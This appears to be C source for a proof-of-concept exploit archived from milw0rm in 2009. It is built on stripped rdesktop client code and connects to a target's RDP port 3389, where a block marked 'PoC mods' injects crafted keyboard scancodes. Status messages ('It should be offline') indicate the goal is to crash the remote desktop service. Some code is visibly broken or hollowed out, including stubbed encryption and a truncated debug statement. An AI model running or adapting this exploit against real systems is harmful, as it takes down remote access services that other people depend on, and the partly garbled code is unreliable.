	rdp_out_order_caps(s);
	rdp_out_bmpcache_caps(s);
	rdp_out_colcache_caps(s);
	rdp_out_activate_caps(s);
	rdp_out_control_caps(s);
	rdp_out_pointer_caps(s);
	rdp_out_share_caps(s);
	rdp_out_unknown_caps(s);

	s_mark_end(s);
	rdp_send(s, RDP_PDU_CONFIRM_ACTIVE);
}



/* Process incoming packets */
void
rdp_main_loop(void)
{
	uint8 type;
	STREAM s;

	while ((s = rdp_recv(&type)) != NULL)
	{
		switch (type)
		{
			case RDP_PDU_DEMAND_ACTIVE:
				process_demand_active(s);
				break;

			case RDP_PDU_DEACTIVATE:
				break;

			case RDP_PDU_DATA:
				process_data_pdu(s);
				break;
			case 0:
				break;

		}
	}
}

/* Establish a connection up to the RDP layer */
BOOL
rdp_connect(char *server, uint32 flags, char *domain, char *password,
	    char *command, char *directory)
{
	if (!sec_connect(server))
		return False;

	rdp_send_logon_info(flags, domain, username, password, command, directory);
	return True;
}

/* Disconnect from the RDP layer */
void
rdp_disconnect(void)
{
	sec_disconnect();
}



/* Reset order state */
void
reset_order_state(void)
{
	memset(&order_state, 0, sizeof(order_state));
	order_state.order_type = RDP_ORDER_PATBLT;
}


static void
reverse(uint8 * p, int len)
{
	int i, j;
	uint8 temp;

	for (i = 0, j = len - 1; i < j; i++, j--)
	{
		temp = p[i];
		p[i] = p[j];
		p[j] = temp;
	}
}


/*
 * General purpose 48-byte transformation, using two 32-byte salts (generally,
 * a client and server salt) and a global salt value used for padding.
 * Both SHA1 and MD5 algorithms are used.
 */
void
sec_hash_48(uint8 * out, uint8 * in, uint8 * salt1, uint8 * salt2, uint8 salt)
{
	uint8 shasig[20];
	uint8 pad[4];
	SHA_CTX sha;
	MD5_CTX md5;
	int i;

	for (i = 0; i < 3; i++)
	{
		memset(pad, salt + i, i + 1);

		SHA1_Init(&sha);
		SHA1_Update(&sha, pad, i + 1);
		SHA1_Update(&sha, in, 48);
		SHA1_Update(&sha, salt1, 32);
		SHA1_Update(&sha, salt2, 32);
		SHA1_Final(shasig, &sha);

		MD5_Init(&md5);
		MD5_Update(&md5, in, 48);
		MD5_Update(&md5, shasig, 20);
		MD5_Final(&out[i * 16], &md5);
	}
}

/*
 * Weaker 16-byte transformation, also using two 32-byte salts, but
 * only using a single round of MD5.
 */
void
sec_hash_16(uint8 * out, uint8 * in, uint8 * salt1, uint8 * salt2)
{
	MD5_CTX md5;

	MD5_Init(&md5);
	MD5_Update(&md5, in, 16);
	MD5_Update(&md5, salt1, 32);
	MD5_Update(&md5, salt2, 32);
	MD5_Final(out, &md5);
}

/* Reduce key entropy from 64 to 40 bits */
static void
sec_make_40bit(uint8 * key)
{
	key[0] = 0xd1;
	key[1] = 0x26;
	key[2] = 0x9e;
}

/* Generate a session key and RC4 keys, given client and server randoms */
static void
sec_generate_keys(uint8 * client_key, uint8 * server_key, int rc4_key_size)
{
	uint8 session_key[48];
	uint8 temp_hash[48];
	uint8 input[48];

	/* Construct input data to hash */
	memcpy(input, client_key, 24);
	memcpy(input + 24, server_key, 24);

	/* Generate session key - two rounds of sec_hash_48 */
	sec_hash_48(temp_hash, input, client_key, server_key, 65);
	sec_hash_48(session_key, temp_hash, client_key, server_key, 88);

	/* Store first 16 bytes of session key, for generating signatures */
	memcpy(sec_sign_key, session_key, 16);

	/* Generate RC4 keys */
	sec_hash_16(sec_decrypt_key, &session_key[16], client_key, server_key);
	sec_hash_16(sec_encrypt_key, &session_key[32], client_key, server_key);

	if (rc4_key_size == 1)
	{

		sec_make_40bit(sec_sign_key);
		sec_make_40bit(sec_decrypt_key);
		sec_make_40bit(sec_encrypt_key);
		rc4_key_len = 8;
	}
	else
	{

		rc4_key_len = 16;
	}

	/* Save initial RC4 keys as update keys */
	memcpy(sec_decrypt_update_key, sec_decrypt_key, 16);
	memcpy(sec_encrypt_update_key, sec_encrypt_key, 16);

	/* Initialise RC4 state arrays */
	RC4_set_key(&rc4_decrypt_key, rc4_key_len, sec_decrypt_key);
	RC4_set_key(&rc4_encrypt_key, rc4_key_len, sec_encrypt_key);
}

static uint8 pad_54[40] = {
	54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54,
	54, 54, 54,
	54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54,
	54, 54, 54
};

static uint8 pad_92[48] = {
	92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92,
	92, 92, 92, 92, 92, 92, 92,
	92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92,
	92, 92, 92, 92, 92, 92, 92
};


/* Transmit secure transport packet */
void
sec_send(STREAM s, uint32 flags)
{
	int datalen;

	s_pop_layer(s, sec_hdr);
	if (!licence_issued || (flags & SEC_ENCRYPT))
		out_uint32_le(s, flags);

	if (flags & SEC_ENCRYPT)
	{
		flags &= ~SEC_ENCRYPT;
		datalen = s->end - s->p - 8;

#if WITH_DEBUG
		DEBUG(("Sending encrypted packet:\n"));
		hexdump(s->p + 8, datalen);
#endif


	}

	mcs_send(s);
}


/* Perform an RSA public key encryption operation */
static void
sec_rsa_encrypt(uint8 * out, uint8 * in, int len, uint8 * modulus, uint8 * exponent)
{
	BN_CTX *ctx;
	BIGNUM mod, exp, x, y;
	uint8 inr[SEC_MODULUS_SIZE];
	int outlen;

	reverse(modulus, SEC_MODULUS_SIZE);
	reverse(exponent, SEC_EXPONENT_SIZE);
	memcpy(inr, in, len);
	reverse(inr, len);

	ctx = BN_CTX_new();
	BN_init(&mod);
	BN_init(&exp);
	BN_init(&x);
	BN_init(&y);

	BN_bin2bn(modulus, SEC_MODULUS_SIZE, &mod);
	BN_bin2bn(exponent, SEC_EXPONENT_SIZE, &exp);
	BN_bin2bn(inr, len, &x);
	BN_mod_exp(&y, &x, &exp, &mod, ctx);
	outlen = BN_bn2bin(&y, out);
	reverse(out, outlen);
	if (outlen < SEC_MODULUS_SIZE)
		memset(out + outlen, 0, SEC_MODULUS_SIZE - outlen);

	BN_free(&y);
	BN_clear_free(&x);
	BN_free(&exp);
	BN_free(&mod);
	BN_CTX_free(ctx);
}

/* Initialise secure transport packet */
STREAM
sec_init(uint32 flags, int maxlen)
{
	int hdrlen;
	STREAM s;

	if (!licence_issued)
		hdrlen = (flags & SEC_ENCRYPT) ? 12 : 4;
	else
		hdrlen = (flags & SEC_ENCRYPT) ? 12 : 0;
	s = mcs_init(maxlen + hdrlen);
	s_push_layer(s, sec_hdr, hdrlen);

	return s;
}




/* Output connect initial data blob */
static void
sec_out_mcs_data(STREAM s)
{
	int hostlen = 2 * strlen(hostname);

	if (hostlen > 30)
		hostlen = 30;

	out_uint16_be(s, 5);	/* unknown */
	out_uint16_be(s, 0x14);
	out_uint8(s, 0x7c);
	out_uint16_be(s, 1);

	out_uint16_be(s, (158 | 0x8000));	/* remaining length */

	out_uint16_be(s, 8);	/* length? */
	out_uint16_be(s, 16);
	out_uint8(s, 0);
	out_uint16_le(s, 0xc001);
	out_uint8(s, 0);

	out_uint32_le(s, 0x61637544);	/* "Duca" ?! */
	out_uint16_be(s, (144 | 0x8000));	/* remaining length */

	/* Client information */
	out_uint16_le(s, SEC_TAG_CLI_INFO);
	out_uint16_le(s, 136);	/* length */
	out_uint16_le(s, 1);
	out_uint16_le(s, 8);
	out_uint16_le(s, width);
	out_uint16_le(s, height);
	out_uint16_le(s, 0xca01);
	out_uint16_le(s, 0xaa03);
	out_uint32_le(s, keylayout);
	out_uint32_le(s, 419);	/* client build? we are 419 compatible :-) */

	/* Unicode name of client, padded to 32 bytes */
	rdp_out_unistr(s, hostname, hostlen);
	out_uint8s(s, 30 - hostlen);

	out_uint32_le(s, 4);
	out_uint32(s, 0);
	out_uint32_le(s, 12);
	out_uint8s(s, 64);	/* reserved? 4 + 12 doublewords */

	out_uint16_le(s, 0xca01);
	out_uint16(s, 0);

	/* Client encryption settings */
	out_uint16_le(s, SEC_TAG_CLI_CRYPT);
	out_uint16_le(s, 8);	/* length */
	out_uint32_le(s, encryption ? 0x3 : 0);	/* encryption supported, 128-bit supported */
	s_mark_end(s);
}

/* Parse a public key structure */
static BOOL
sec_parse_public_key(STREAM s, uint8 ** modulus, uint8 ** exponent)
{
	uint32 magic, modulus_len;

	in_uint32_le(s, magic);
	if (magic != SEC_RSA_MAGIC)
	{
		error("RSA magic 0x%x\n", magic);
		return False;
	}

	in_uint32_le(s, modulus_len);
	if (modulus_len != SEC_MODULUS_SIZE + SEC_PADDING_SIZE)
	{
		error("modulus len 0x%x\n", modulus_len);
		return False;
	}

	in_uint8s(s, 8);	/* modulus_bits, unknown */
	in_uint8p(s, *exponent, SEC_EXPONENT_SIZE);
	in_uint8p(s, *modulus, SEC_MODULUS_SIZE);
	in_uint8s(s, SEC_PADDING_SIZE);

	return s_check(s);
}

/* Parse a crypto information structure */
static BOOL
sec_parse_crypt_info(STREAM s, uint32 * rc4_key_size,
		     uint8 ** server_random, uint8 ** modulus, uint8 ** exponent)
{
	uint32 crypt_level, random_len, rsa_info_len;
	uint16 tag, length;
	uint8 *next_tag, *end;

	in_uint32_le(s, *rc4_key_size);	/* 1 = 40-bit, 2 = 128-bit */
	in_uint32_le(s, crypt_level);	/* 1 = low, 2 = medium, 3 = high */
	if (crypt_level == 0)	/* no encryptation */
		return False;
	in_uint32_le(s, random_len);
	in_uint32_le(s, rsa_info_len);

	if (random_len != SEC_RANDOM_SIZE)
	{
		error("random len %d\n", random_len);
		return False;
	}

	in_uint8p(s, *server_random, random_len);

	/* RSA info */
	end = s->p + rsa_info_len;
	if (end > s->end)
		return False;

	in_uint8s(s, 12);	/* unknown */

	while (s->p < end)
	{
		in_uint16_le(s, tag);
		in_uint16_le(s, length);

		next_tag = s->p + length;

		switch (tag)
		{
			case SEC_TAG_PUBKEY:
				if (!sec_parse_public_key(s, modulus, exponent))
					return False;

				break;

			case SEC_TAG_KEYSIG:
				/* Is this a Microsoft key that we just got? */
				/* Care factor: zero! */
				break;
		}

		s->p = next_tag;
	}

	return s_check_end(s);
}

/* Process crypto information blob */
static void
sec_process_crypt_info(STREAM s)
{
	uint8 *server_random, *modulus, *exponent;
	uint8 client_random[SEC_RANDOM_SIZE];
	uint32 rc4_key_size;

	if (!sec_parse_crypt_info(s, &rc4_key_size, &server_random, &modulus, &exponent))
		return;

	/* Generate a client random, and hence determine encryption keys */
	sec_rsa_encrypt(sec_crypted_random, client_random, SEC_RANDOM_SIZE, modulus, exponent);
	sec_generate_keys(client_random, server_random, rc4_key_size);
}

/* Process connect response data blob */
static void
sec_process_mcs_data(STREAM s)
{
	uint16 tag, length;
	uint8 *next_tag;
	uint8 len;

	in_uint8s(s, 21);	/* header */
	in_uint8(s, len);
	if (len & 0x80)
		in_uint8(s, len);

	while (s->p < s->end)
	{
		in_uint16_le(s, tag);
		in_uint16_le(s, length);

		if (length <= 4)
			return;

		next_tag = s->p + length - 4;

		switch (tag)
		{
			case SEC_TAG_SRV_INFO:
			case SEC_TAG_SRV_3:
				break;

			case SEC_TAG_SRV_CRYPT:
				sec_process_crypt_info(s);
				break;
		}

		s->p = next_tag;
	}
}

/* Receive secure transport packet */
STREAM
sec_recv(void)
{
	uint32 sec_flags;
	STREAM s;

	while ((s = mcs_recv()) != NULL)
	{
		if (encryption || !licence_issued)
		{
			in_uint32_le(s, sec_flags);

			if (sec_flags & SEC_LICENCE_NEG)
			{
				licence_process(s);
				continue;
			}

			if (sec_flags & SEC_ENCRYPT)
			{
				in_uint8s(s, 8);	/* signature */

			}
		}

		return s;
	}

	return NULL;
}

/* Establish a secure connection */
BOOL
sec_connect(char *server)
{
	struct stream mcs_data;

	/* We exchange some RDP data during the MCS-Connect */
	mcs_data.size = 512;
	mcs_data.p = mcs_data.data = xmalloc(mcs_data.size);
	sec_out_mcs_data(&mcs_data);

	if (!mcs_connect(server, &mcs_data))
		return False;

	sec_process_mcs_data(&mcs_data);

	xfree(mcs_data.data);
	return True;
}

/* Disconnect a connection */
void
sec_disconnect(void)
{
	mcs_disconnect();
}


/* Initialise TCP transport data packet */
STREAM
tcp_init(int maxlen)
{
	if (maxlen > out.size)
	{
		out.size = maxlen;
	}

	out.p = out.data;
	out.end = out.data + out.size;
	return &out;
}

/* Send TCP transport data packet */
void
tcp_send(STREAM s)
{
	int length = s->end - s->data;
	int sent, total = 0;

	while (total < length)
	{
		sent = send(sock, s->data + total, length - total, 0);
		if (sent <= 0)
		{
			fprintf(stderr, "\n[=] Check port 3389 on target host. It should be offline.\n\n");
			return;
		}

		total += sent;
	}
}

/* Receive a message on the TCP layer */
STREAM
tcp_recv(int length)
{
	int rcvd = 0;

	if (length > in.size)
	{

		in.size = length;
	}

	in.end = in.p = in.data;

	while (length > 0)
	{
		if (!ui_select(sock))
			/* User quit */
			return NULL;

		rcvd = recv(sock, in.end, length, 0);
		if (rcvd == -1)
		{
			error("recv: %s", strerror(errno));
			return NULL;
		}

		in.end += rcvd;
		length -= rcvd;
	}

	return &in;
}

/* Establish a connection on the TCP layer */
BOOL
tcp_connect(char *server)
{
	struct hostent *nslookup;
	struct sockaddr_in servaddr;
	int true = 1;

	if ((nslookup = gethostbyname(server)) != NULL)
	{
		memcpy(&servaddr.sin_addr, nslookup->h_addr, sizeof(servaddr.sin_addr));
	}
	else if ((servaddr.sin_addr.s_addr = inet_addr(server)) == INADDR_NONE)
	{
		error("%s: unable to resolve host\n", server);
		return False;
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		error("socket: %s\n", strerror(errno));
		return False;
	}

	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(tcp_port_rdp);

	if (connect(sock, (struct sockaddr *) &servaddr, sizeof(struct sockaddr)) < 0)
	{
		error("connect: %s\n", strerror(errno));
		close(sock);
		return False;
	}

	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *) &true, sizeof(true));

	in.size = 4096;
	in.data = xmalloc(in.size);

	out.size = 4096;
	out.data = xmalloc(out.size);

	return True;
}

/* Disconnect on the TCP layer */
void
tcp_disconnect(void)
{
	fprintf(stderr, "\n[=] Done. Check port 3389 on the remote host.\n\n");
	close(sock);
}



/* Returns 0 after user quit, 1 otherwise */
int
ui_select(int rdp_socket)
{
	int n = (rdp_socket > x_socket) ? rdp_socket + 1 : x_socket + 1;
	fd_set rfds;



// Begin PoC mods
        XEvent xevent;
        KeySym keysym;
        uint32 ev_time;
        key_translation tr;
        if (ix-- >= 0)
        { return 1; }
        ev_time = time(NULL);
        handle_special_keys(keysym, xevent.xkey.state, ev_time, True);
	tr = xkeymap_translate_key(keysym, xevent.xkey.keycode, xevent.xkey.state);
	ensure_remote_modifiers(ev_time, tr);
	rdp_send_scancode(ev_time, RDP_KEYPRESS, tr.scancode);
// End PoC mods



	FD_ZERO(&rfds);
	while (True)
	{
		/* Process any events already waiting */

//		if (!xwin_process_events())
//			/* User quit */
//			return 0;

		FD_ZERO(&rfds);
		FD_SET(rdp_socket, &rfds);
		FD_SET(x_socket, &rfds);

		switch (select(n, &rfds, NULL, NULL, NULL))
		{
			case -1:
				error("select: %s\n", strerror(errno));

			case 0:
				continue;
		}

		if (FD_ISSET(rdp_socket, &rfds))
			return 1;
	}
}


key_translation
xkeymap_translate_key(uint32 keysym, unsigned int keycode, unsigned int state)
{
	key_translation tr = { 0, 0 };

	tr = keymap[keysym & KEYMAP_MASK];

	if (tr.modifiers & MapInhibitMask)
	{

		tr.scancode = 0;
		return tr;
	}

	if (tr.modifiers & MapLocalStateMask)
	{
		/* The modifiers to send for this key should be obtained
		   from the local state. Currently, only shift is implemented. */
		if (state & ShiftMask)
		{
			tr.modifiers = MapLeftShiftMask;
		}
	}

	if (tr.scancode != 0)
	{
		return tr;
	}

	if (keymap_loaded)


	/* not in keymap, try to interpret the raw scancode */
	if ((keycode >= min_keycode) && (keycode <= 0x60))
	{
		tr.scancode = keycode - min_keycode;

		/* The modifiers to send for this key should be
		   obtained from the local state. Currently, only
		   shift is implemented. */
		if (state & ShiftMask)
		{
			tr.modifiers = MapLeftShiftMask;
		}


	}
	else
	{

	}

	return tr;
}


static void
update_modifier_state(uint8 scancode, BOOL pressed)
{
#ifdef WITH_DEBUG_KBD
	uint16 old_modifier_state;

	old_modifier_state = remote_modifier_state;
#endif

	switch (scancode)
	{
		case SCANCODE_CHAR_LSHIFT:
			MASK_CHANGE_BIT(remote_modifier_state, MapLeftShiftMask, pressed);
			break;
		case SCANCODE_CHAR_RSHIFT:
			MASK_CHANGE_BIT(remote_modifier_state, MapRightShiftMask, pressed);
			break;
		case SCANCODE_CHAR_LCTRL:
			MASK_CHANGE_BIT(remote_modifier_state, MapLeftCtrlMask, pressed);
			break;
		case SCANCODE_CHAR_RCTRL:
			MASK_CHANGE_BIT(remote_modifier_state, MapRightCtrlMask, pressed);
			break;
		case SCANCODE_CHAR_LALT:
			MASK_CHANGE_BIT(remote_modifier_state, MapLeftAltMask, pressed);
			break;
		case SCANCODE_CHAR_RALT:
			MASK_CHANGE_BIT(remote_modifier_state, MapRightAltMask, pressed);
			break;
		case SCANCODE_CHAR_LWIN:
			MASK_CHANGE_BIT(remote_modifier_state, MapLeftWinMask, pressed);
			break;
		case SCANCODE_CHAR_RWIN:
			MASK_CHANGE_BIT(remote_modifier_state, MapRightWinMask, pressed);
			break;
		case SCANCODE_CHAR_NUMLOCK:
			/* KeyReleases for NumLocks are sent immediately. Toggle the
			   modifier state only on Keypress */
			if (pressed)
			{
				BOOL newNumLockState;
				newNumLockState =
					(MASK_HAS_BITS
					 (remote_modifier_state, MapNumLockMask) == False);
				MASK_CHANGE_BIT(remote_modifier_state,
						MapNumLockMask, newNumLockState);
			}
			break;
	}

#ifdef WITH_DEBUG_KBD
	if (old_modifier_state != remote_modifier_state)
	{

			   old_modifier_state, pressed));

	}
#endif

}


/* free */
void
xfree(void *mem)
{
	free(mem);
}

/* report an error */
void
error(char *format, ...)
{
	va_list ap;

	fprintf(stderr, "[=] Error: ");

	va_start(ap, format);
	vfprintf(stderr, format, ap);
	va_end(ap);
}



/* malloc; exit if out of memory */
void *
xmalloc(int size)
{
	void *mem = malloc(size);
	if (mem == NULL)
	{
		error("xmalloc %d\n", size);
		exit(1);
	}
	return mem;
}

// milw0rm.com [2009-04-17]
